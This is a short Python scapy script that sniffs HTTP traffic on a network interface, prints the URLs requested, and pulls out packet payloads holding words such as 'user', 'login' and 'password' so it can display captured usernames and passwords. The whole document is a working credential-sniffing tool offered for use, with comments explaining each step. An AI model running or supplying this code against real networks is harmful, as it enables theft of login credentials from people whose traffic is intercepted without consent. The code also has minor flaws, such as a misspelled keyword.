
#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPacket)
#iface= interface I want to sniff, store=false to not store the sniffs data, prn=another Function to call

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #this will get the url with pat

def get_login_info(packet):
     if packet.haslayer(scapy.Raw): # tthe password stored in the raw field
            load = str(packet[scapy.Raw].load) #this filter to store and print the load
            keyword = ['usernmae','user', 'login', 'password', 'pass']
            for key in keyword:
                if key in load:
                    return load                 

def processSniffedPacket(packet):
    if packet.haslayer(http.HTTPRequest): #this filter will check if the packet has HTTP will print the packet
        url = get_url(packet)
        print('[+]HTTPRequest: '+str(url))
        loginInfo = get_login_info(packet)
        if loginInfo:
              print('\nHere you will find the userName and the Password:\n\n-___ ' + str(loginInfo)+'_--') 
       
sniff("en0") # here you have to specify the interface that you want to capture the traffic on




















